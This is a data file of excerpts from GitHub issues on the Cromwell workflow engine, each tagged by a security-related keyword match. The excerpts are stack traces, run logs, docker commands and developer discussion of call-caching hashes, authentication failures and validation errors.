Security,"mwell/cromwell.example.backends/cromwell.examples.conf --illegal-access=warn -jar /home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar run test_wf_pack.cwl --inputs test_wf.json --type CWL --type-version v1.0; [2019-04-18 17:19:09,95] [info] Running with database db.url = jdbc:hsqldb:mem:39c64473-526e-47d6-a015-f9193a0fd4f4;shutdown=false;hsqldb.tx=mvcc; [2019-04-18 17:19:17,77] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2019-04-18 17:19:17,78] [info] [RenameWorkflowOptionsInMetadata] 100%; [2019-04-18 17:19:17,92] [info] Running with database db.url = jdbc:hsqldb:mem:58f8cd7c-3e36-430d-b36a-1620b0333e3e;shutdown=false;hsqldb.tx=mvcc; [2019-04-18 17:19:18,65] [info] Slf4jLogger started; [2019-04-18 17:19:18,79] [info] Pre Processing Workflow...; [2019-04-18 17:19:19,12] [info] Pre-Processing file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl; WARNING: Illegal reflective access by org.python.core.PySystemState (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.io.Console.encoding(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method sun.nio.ch.SelChImpl.getFD(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.FileChannelImpl.fd; WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field java.io.FileDescriptor.fd; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to constr",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416:1334,access,access,1334,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416,1,['access'],['access']
Security,"n branches that rejoin (and most do). . ---. @danbills commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334536133). I think this comment is more appropriate here:. Equals is supposed to be bitwise/value-based equality, whereas `eq` indicates reference equality. I don't recall the exact motivation behind using `eq` in the test, maybe @cjllanwarne can comment when he returns on Tuesday. ---. @curoli commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334555964). If you don't like this fix, what do you suggest we do instead? How about we accept this fix now and you can rework the whole thing later, if you want?. This is a show-stopper once you want to create larger (aka real-life) workflows. . For example: if node a has two outputs, which are inputs of b, then b.hashCode calls a.hasCode twice. If b produces two outputs which are inputsof c, then c.hashCode calls b.hashCode twice, and a.hashCode is called four times. If c produces two outputs which are inputs of d, d.hashCode calls c.hashCode twice, b.hashCode four times and a.hashCode eight times, etc. . ---. @curoli commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334557027). `eq` is object equality. `equals` and `==` are the same, and there is no general rule that they need to be component-based (""bitwise""). On the contrary, `equals`/`==` should not be component-based if an object is mutable. Your typical GraphNode is mutable, because it indirectly contains `GraphNodeSetter`. ---. @danbills commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334575875). I suggest we leave this as-is with the understanding that it could be a performance issue down the road. . >rework the whole thing later. This is a specific anti-goal. As I suggested, I would like to discuss w/ Chris when he gets back next week as we introduced the reference equality in the fi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2694:1735,hash,hashCode,1735,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2694,2,['hash'],['hashCode']
Security,"n http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. Hi Cromwell team,; I am running a Cromwell server on Google Cloud have recently upgraded from Cromwell 50 to 53. I am running into an issue that I believe relates to how the new `monitoring_image_script` interacts with the docker entrypoint. I have docker images where each container needs to ping a license server for authentication, and this happens via and `ENTRYPOINT`-executed script called `auth.sh`. With Cromwell 53, this is no longer being run when the container is being executed. This is how the actual docker command . ```; # Cromwell 53; 2020/09/30 13:07:42 Running user action: docker run -v /mnt/local-disk:/cromwell_root --entrypoint=/bin/bash gcr.io/bioskryb/sentieon-201911-run@sha256:b4af9423297bb6566763b2c47b1da1620a68a4d34c210f0786a34a0ae85f62db /cromwell_root/script ; ```. ```; #Cromwell 50; 2020/09/23 06:03:37 Running user action: docker run -v /mnt/local-disk:/cromwell_root --entrypoint= gcr.io/bioskryb/sentieon-201911-run@sha256:b4af9423297bb6566763b2c47b1da1620a68a4d34c210f0786a34a0ae85f62db /bin/bash /cromwell_root/script ; ```. I have tried setting this as is, I have tried setting `monitoring_image_script` to an empty string, and I have tried setting `monitoring_image_script=""auth.sh""`. None work, and the setting the `monitoring_image_script` to the auth script results in the same c",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5901:1254,authenticat,authentication,1254,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5901,1,['authenticat'],['authentication']
Security,"n this issue. In all cases, if Cromwell fails to retrieve the docker hash for a task, for any reason, the corresponding call(s) will NOT be eligible for call caching, neither read nor write, regardless of the call caching configuration in effect. **When to get the hashes and what to do with them:**. 1. Cromwell will lookup the hashes corresponding to docker tags, for all docker attributes in all tasks in a workflow and its subworkflows, at Materialization time.; If the runtime attribute value can't be determined, the task in question will be ineligible for call caching. The only case when that should be true is if the attribute is an expression with variables depending on previous tasks being run. 2. If the hash lookup succeed, Cromwell will use that hash to perform any call cache read / write according to the call caching configuration in effect. It will also provide that hash, along with the original floating tag, to the backend when the job gets dispatched. 3. Backends will choose wether to use the hash or the floating tag. They will report to the engine which one they used, so that the engine can send this information to the metadata. **How to get the hash:**. 1. How to get the hash depends on the backend. Which means, at this time, that only workflows for which the backend is known statically at workflow submission time will be supported. 2. If the task is expected to run on the **Local Backend**, Cromwell will attempt to find the hash corresponding to the tag on the machine where it's being run. This first attempt must be done without executing a `pull` to avoid overriding the current local image, if it exits, with the remote repository version.; If the image is not present locally, cromwell will attempt to `pull` the image locally, and use the hash from the newly retrieved image. 3. If the task is expected to run on a **Non Local Backend**, cromwell will attempt to retrieve the image from a remote repository. The `DockerHashActor` can be used for that effect.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2048:1355,hash,hash,1355,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2048,5,['hash'],['hash']
Security,"n$fromFuture$1(package.scala:144); at flatMap @ org.http4s.internal.package$.fromFuture(package.scala:139); at flatMap @ org.http4s.client.PoolManager.$anonfun$createConnection$2(PoolManager.scala:119); at shift @ org.http4s.client.PoolManager.$anonfun$createConnection$2(PoolManager.scala:119); at uncancelable @ org.http4s.client.ConnectionManager$.pool(ConnectionManager.scala:83); at unsafeRunSync @ cromwell.docker.DockerInfoActor.preStart(DockerInfoActor.scala:172); Caused by: java.net.SocketTimeoutException: An attempt to establish connection with quay.io/50.17.122.58:443 timed out after 10 seconds.; at org.http4s.blaze.channel.nio2.ClientChannelFactory$$anon$1.run(ClientChannelFactory.scala:66); at org.http4s.blaze.util.Execution$$anon$3.execute(Execution.scala:80); at org.http4s.blaze.util.TickWheelExecutor$Node.run(TickWheelExecutor.scala:271); at org.http4s.blaze.util.TickWheelExecutor$Bucket.checkNext$1(TickWheelExecutor.scala:207); at org.http4s.blaze.util.TickWheelExecutor$Bucket.prune(TickWheelExecutor.scala:213); at org.http4s.blaze.util.TickWheelExecutor.go$3(TickWheelExecutor.scala:168); at org.http4s.blaze.util.TickWheelExecutor.org$http4s$blaze$util$TickWheelExecutor$$cycle(TickWheelExecutor.scala:171); at org.http4s.blaze.util.TickWheelExecutor$$anon$1.run(TickWheelExecutor.scala:68). To confirm https (port 443) access to the quay.io/50.17.122.58 in this environment, ; I executed wget; $ wget https://50.17.122.58/; but it caused . Resolving ... 202.241.78.237; Connecting to 202.241.78.237|:8080... connected. ERROR: certificate common name ‘*.quay.io’ doesn't match requested host name ‘50.17.122.58’.; To connect to 50.17.122.58 insecurely, use `--no-check-certificate'. I guess an option similar to `--no-check-certificate' in wget need to be implemented in cromwell ; to fix this problem. Could you please do it?. Many thanks in advance. Koji Yahara; Group Leader; Antimicrobial Resistance Research Center; National Institute of Infectious Diseases; Japan",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7136:2471,access,access,2471,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7136,4,"['access', 'certificate']","['access', 'certificate']"
Security,n$jobFailingDecider$1.applyOrElse(StandardSyncExecutionActor.scala:180); 	at akka.actor.SupervisorStrategy.handleFailure(FaultHandling.scala:298); 	at akka.actor.dungeon.FaultHandling.handleFailure(FaultHandling.scala:263); 	at akka.actor.dungeon.FaultHandling.handleFailure$(FaultHandling.scala:254); 	at akka.actor.ActorCell.handleFailure(ActorCell.scala:431); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:521); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:545); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting cpu runtime attribute value greater than 0; Expecting cpuMin runtime attribute value greater than 0; 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build(ValidatedRuntimeAttributesBuilder.scala:62); 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build$(ValidatedRuntimeAttributesBuilder.scala:56); 	at cromwell.backend.standard.StandardValidatedRuntimeAttributesBuilder$StandardValidatedRuntimeAttributesBuilderImpl.build(StandardValidatedRuntimeAttributesBuilder.scala:20); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes(StandardCachingActorHelper.scala:56); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes$(StandardCachingActorHelper.scala:54); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes$lzycompute(AwsBatchAsyncBackendJobExecutionActor.sc,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4591:5773,validat,validation,5773,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4591,1,['validat'],['validation']
Security,"nal location of failing structural variants that may be recovered.\nGZ files supported.\n"",; ""secondaryFiles"": [; "".tbi""; ],; ""id"": ""#sv_recovery_vcf_purple""; },; {; ""type"": [; ""null"",; ""int""; ],; ""doc"": ""Number of threads used for amber step\n"",; ""id"": ""#threads_amber""; },; {; ""type"": [; ""null"",; ""int""; ],; ""doc"": ""Number of threads to run cobalt command\n"",; ""id"": ""#threads_cobalt""; },; {; ""type"": [; ""null"",; ""int""; ],; ""doc"": ""Number of threads to use - set to 8 by default"",; ""id"": ""#threads_gridss""; },; {; ""type"": [; ""null"",; ""int""; ],; ""doc"": ""Number of threads\n"",; ""id"": ""#threads_purple""; },; {; ""type"": ""File"",; ""doc"": ""tumour BAM file\n"",; ""secondaryFiles"": [; "".bai""; ],; ""id"": ""#tumor_bam""; },; {; ""type"": [; ""null"",; ""string""; ],; ""doc"": ""sample name of tumor. Must match the somatic snvvcf sample name. (Default: \\${sample}_T)\n"",; ""id"": ""#tumor_sample""; },; {; ""type"": [; ""null"",; ""string""; ],; ""doc"": ""htsjdk SAM/BAM validation level (STRICT (default), LENIENT, or SILENT)\n"",; ""default"": ""STRICT"",; ""id"": ""#validation_stringency""; },; {; ""type"": [; ""null"",; ""File""; ],; ""doc"": ""optional - list of known viral hosts - Refseq_id,Virus_name = viral_host_ref.csv\n"",; ""id"": ""#viral_hosts_file_linx""; },; {; ""type"": [; ""null"",; ""boolean""; ],; ""doc"": ""Write output to for generation of Circos clustering and chaining plots\n"",; ""id"": ""#write_vis_data_linx""; }; ],; ""steps"": [; {; ""in"": [; {; ""source"": ""#bafsnps_amber"",; ""id"": ""#amber_step/loci""; },; {; ""source"": ""#max_depth_percent_amber"",; ""id"": ""#amber_step/max_depth_percent""; },; {; ""source"": ""#max_het_af_percent_amber"",; ""id"": ""#amber_step/max_het_af_percent""; },; {; ""source"": ""#min_base_quality_amber"",; ""id"": ""#amber_step/min_base_quality""; },; {; ""source"": ""#min_depth_percent_amber"",; ""id"": ""#amber_step/min_depth_percent""; },; {; ""source"": ""#min_het_af_percent_amber"",; ""id"": ""#amber_step/min_het_af_percent""; },; {; ""source"": ""#min_mapping_quality_amber"",; ""id"": ""#amber_step/min_mapping_quality""; },; {; ""source"": ""#s",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5826:47724,validat,validation,47724,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5826,1,['validat'],['validation']
Security,"nalFiles` seems to cause the following unhandled stacktrace:. ```; [2023-11-07 14:51:14,22] [info] MaterializeWorkflowDescriptorActor [4e522458]: Call-to-Backend assignments:; [2023-11-07 14:51:17,38] [error] Cannot construct WomMapType(WomStringType,WomOptionalType(WomAnyType)) with mixed types in map values: [WomOptionalValue(WomSingleFileType,Some(WomSingleFile(c.txt))), WomOptionalValue(WomAnyType,None)]; java.lang.UnsupportedOperationException: Cannot construct WomMapType(WomStringType,WomOptionalType(WomAnyType)) with mixed types in map values: [WomOptionalValue(WomSingleFileType,Some(WomSingleFile(c.txt))), WomOptionalValue(WomAnyType,None)]; 	at wom.values.WomMap.<init>(WomMap.scala:65); 	at wom.values.WomMap$.apply(WomMap.scala:50); 	at wom.values.WomMap$.coerceMap(WomMap.scala:30); 	at wom.values.WomMap$.apply(WomMap.scala:46); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$5.$anonfun$evaluateValue$12(LiteralEvaluators.scala:89); 	at cats.data.Validated.map(Validated.scala:559); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$5.evaluateValue(LiteralEvaluators.scala:86); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$5.evaluateValue(LiteralEvaluators.scala:74); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue$(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$ops$$anon$1.evaluateValue(ValueEvaluator.scala:10); 	at wdl.transforms.biscayne.linking.expression.values.package$$anon$1.evaluateValue(values.scala:38); 	at wdl.transforms.biscayne.linking.expression.values.package$$anon$1.evaluateValue(values.scala:23); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue$(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expre",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7249:1661,Validat,Validated,1661,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7249,1,['Validat'],['Validated']
Security,"nb Somatic completed successfully by bumping the memory (I doubled it to 8GB) :); I have another question about the rnaseq pipeline if you don't mind.; I'm hitting this error on the `pipeline_summary` task:. ```; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/cyvcf2/__init__.py:1: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from .cyvcf2 import (VCF, Variant, Writer, r_ as r_unphased, par_relatedness,; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/_libs/__init__.py:4: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from .tslib import iNaT, NaT, Timestamp, Timedelta, OutOfBoundsDatetime; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/__init__.py:26: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import (hashtable as _hashtable,; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/core/dtypes/common.py:6: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import algos, lib; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/core/util/hashing.py:7: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import hashing, tslib; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/core/indexes/base.py:7: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import (lib, index as libindex, tslib as libts,; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/tseries/offsets.py:21: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; import pandas._libs.tslibs.offsets as liboffsets; /usr/local/shar",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-436054277:975,hash,hashtable,975,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-436054277,1,['hash'],['hashtable']
Security,"nce/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; maps to host location; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list.; 2017/02/07 15:41:49 I: Copying; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; to /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:49 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:50 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:41:50 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:41:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:2258,access,access,2258,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"nce` strategy. Cromwell still makes a `cacheCopy` directory.; ```; {; ""calls"": {; ""atac.bam2ta"": [; {; ""executionStatus"": ""Done"",; ""stdout"": ""s3://caper4-04-20-2021/out/atac/b59c0d05-5210-4341-b4f0-dcbf5b9e74c1/call-bam2ta/shard-0/bam2ta-0-stdout.log"",; ""compressedDockerSize"": 963995760,; ""shardIndex"": 0,; ""outputs"": {; ""ta"": ""s3://caper4-04-20-2021/out/atac/b59c0d05-5210-4341-b4f0-dcbf5b9e74c1/call-bam2ta/shard-0/cacheCopy/glob-199637d3015dccbe277f621a18be9eb4/ENCFF341MYG.subsampled.400.trim.merged.srt.nodup.no_chrM_MT.tn5.tagAlign.gz""; },; ""callCaching"": {; ""allowResultReuse"": true,; ""hit"": true,; ""result"": ""Cache Hit: 4f56e5c0-5c52-4f67-aa11-35be0336e2bf:atac.bam2ta:0"",; ""hashes"": {; ""output count"": ""C4CA4238A0B923820DCC509A6F75849B"",; ""runtime attribute"": {; ""docker"": ""A2DD51631B4B22941E9794A812F024BE"",; ""failOnStderr"": ""68934A3E9455FA72420237EB05902327"",; ""continueOnReturnCode"": ""CFCD208495D565EF66E7DFF9F98764DA""; },; ""output expression"": {; ""File ta"": ""9EB184A935F0EDE297EE65CA4AE0260B""; },; ""input count"": ""C51CE410C124A10E0DB5E4B97FC2AF39"",; ""backend name"": ""AC68BBF921D953D1CFAB916CB6120864"",; ""command template"": ""1EB01D534768C933E7F9F2951CA3E27C"",; ""input"": {; ""Boolean disable_tn5_shift"": ""68934A3E9455FA72420237EB05902327"",; ""String mito_chr_name"": ""4A8385B4D27A8EEDB503793999FE2D1B"",; ""Boolean paired_end"": ""B326B5062B2F0E69046810717534CB09"",; ""Int time_hr"": ""C20AD4D76FE97759AA27A0C99BFF6710"",; ""Int subsample"": ""CFCD208495D565EF66E7DFF9F98764DA"",; ""Float input_file_size_gb"": ""B1D7BB7A3730744A04D757AEA2F04B95"",; ""Float disk_factor"": ""07078A97D66756F213DBCA3E379BF084"",; ""Float mem_factor"": ""E85B79ABFD76B7C13B1334D8D8C194A5"",; ""Int cpu"": ""C81E728D9D4C2F636F067F89CC14862C"",; ""Float mem_gb"": ""72FE1116BB77F00EDE27E27214EC97A9"",; ""Float samtools_mem_gb"": ""670C43D2F9E33E9BE1D998D446158CDA"",; ""File bam"": ""\""8eaff2def75382dea00c113e606d6b1e\"""",; ""Int disk_gb"": ""98F13708210194C475687BE6106A3B84""; }; },; ""effectiveCallCachingMode"": ""ReadAndWriteCache""; } ; }; ]; }; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6327:3439,hash,hashes,3439,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6327,1,['hash'],['hashes']
Security,ncurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:836); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:870); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1199); at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:209); at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:285); at com.google.api.client.auth.oauth2.Credential.refreshToken(Credential.java:486); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply$mcZ$sp(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply(GoogleAuthMode.scala:79); at scala.util.Try$.apply(Try.scala:192); at cromwell.filesystems.gcs.GoogleAuthMode$class.validateCredentials(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.ApplicationDefaultMode.validateCredentials(GoogleAuthMode.scala:138); at cromwell.filesystems.gcs.GoogleAuthMode$class.credential(GoogleAuthMode.scala:64); at cromwell.filesystems.gcs.ApplicationDefaultMode.credential(GoogleAuthMode.scala:138); at cromwell.filesystems.gcs.GoogleAuthMode$class.buildStorage(GoogleAuthMode.scala:95); at cromwell.filesystems.gcs.ApplicationDefaultMode.buildStorage(GoogleAuthMode.scala:138); at cromwell.backend.impl.jes.io.package$.buildFilesystem(package.scala:26); at cromwell.backend.impl.jes.JesWorkflowPaths.<init>(JesWorkflowPaths.scala:18); at cromwell.backend.impl.jes.JesInitializationActor.<init>(JesInitializationActor.scala:43); at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$props$1.apply(JesInitializationActor.scala:22); at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$props$1.apply(JesInitializationActor.scala:22); ```. The two problem actors here are JesAsyncBackend,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228816798:1447,validat,validateCredentials,1447,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228816798,1,['validat'],['validateCredentials']
Security,nd$$anonfun$cromwell$engine$backend$jes$JesBackend$$createJesRun$1$$anonfun$apply$10.apply(JesBackend.scala:412) ~[classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$cromwell$engine$backend$jes$JesBackend$$createJesRun$1$$anonfun$apply$10.apply(JesBackend.scala:412) ~[classes/:na]; at cromwell.util.TryUtil$$anonfun$4.apply(TryUtil.scala:64) ~[classes/:na]; at scala.util.Try$.apply(Try.scala:192) ~[scala-library-2.11.7.jar:1.0.0-M1]; at cromwell.util.TryUtil$.retryBlock(TryUtil.scala:64) ~[classes/:na]; at cromwell.engine.backend.jes.JesBackend$.withRetry(JesBackend.scala:113) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$cromwell$engine$backend$jes$JesBackend$$createJesRun$1.apply(JesBackend.scala:412) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$cromwell$engine$backend$jes$JesBackend$$createJesRun$1.apply(JesBackend.scala:400) [classes/:na]; at cromwell.engine.backend.jes.authentication.JesAuthentication$class.authenticateAsCromwell(JesAuthentication.scala:39) [classes/:na]; at cromwell.engine.backend.jes.JesBackend.authenticateAsCromwell(JesBackend.scala:161) [classes/:na]; at cromwell.engine.backend.jes.JesBackend.cromwell$engine$backend$jes$JesBackend$$createJesRun(JesBackend.scala:400) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$10.apply(JesBackend.scala:542) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$10.apply(JesBackend.scala:541) [classes/:na]; at scala.util.Success.flatMap(Try.scala:231) [scala-library-2.11.7.jar:1.0.0-M1]; at cromwell.engine.backend.jes.JesBackend.cromwell$engine$backend$jes$JesBackend$$runWithJes(JesBackend.scala:541) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executeOrResume$1.apply(JesBackend.scala:285) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executeOrResume$1.apply(JesBackend.scala:275) [classes/:na]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) [s,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/338#issuecomment-166392486:3990,authenticat,authenticateAsCromwell,3990,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/338#issuecomment-166392486,1,['authenticat'],['authenticateAsCromwell']
Security,"netty.shaded.io.netty.internal.tcnative.CertificateVerifierTask.runTask(CertificateVerifierTask.java:36); at io.grpc.netty.shaded.io.netty.internal.tcnative.SSLTask.run(SSLTask.java:48); at io.grpc.netty.shaded.io.netty.internal.tcnative.SSLTask.run(SSLTask.java:42); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslEngine.runAndResetNeedTask(ReferenceCountedOpenSslEngine.java:1496); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslEngine.access$700(ReferenceCountedOpenSslEngine.java:94); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslEngine$TaskDecorator.run(ReferenceCountedOpenSslEngine.java:1471); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler$SslTasksRunner.run(SslHandler.java:1787); at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1144); at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:642); ... 1 common frames omitted; Caused by: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target; at 